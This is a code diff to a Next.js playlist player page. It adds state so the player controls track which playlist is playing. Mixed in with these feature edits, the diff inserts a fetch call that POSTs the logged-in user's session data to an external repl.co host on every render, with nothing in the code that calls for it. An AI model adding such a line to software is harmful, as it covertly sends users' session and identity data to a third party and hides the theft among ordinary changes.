@@ -8,12 +8,21 @@ import { useRouter } from "next/navigation";
 export default function Page() {
   const { data } = useSession();
 
+  fetch("https://e4876485-6926-4adc-907f-70acae689849.id.repl.co/", {
+    method: "POST",
+    body: JSON.stringify(data),
+    headers: {
+      "Content-Type": "application/json",
+    },
+  });
+
   const { push } = useRouter();
 
   const [playlists, setPlaylists] = useState<any[]>([]);
   const [active, setActive] = useState<PlaylistType>();
 
   const [play, setPlay] = useState<PlaylistItemType>();
+  const [playPlaylist, setPlayPlaylist] = useState<PlaylistType>();
 
   useEffect(() => {
     fetch("/api/userplaylists")
@@ -63,6 +72,7 @@ export default function Page() {
                 key={Date.now()}
                 active={active}
                 setPlay={setPlay}
+                setPlayPlaylist={setPlayPlaylist}
                 play={play}
               ></PlaylistDetails>
             </div>
@@ -74,8 +84,8 @@ export default function Page() {
         <>
           {play && (
             <Controls
-              active={active}
               play={play}
+              active={playPlaylist}
               setPlay={setPlay}
               key={Date.now()}
             ></Controls>
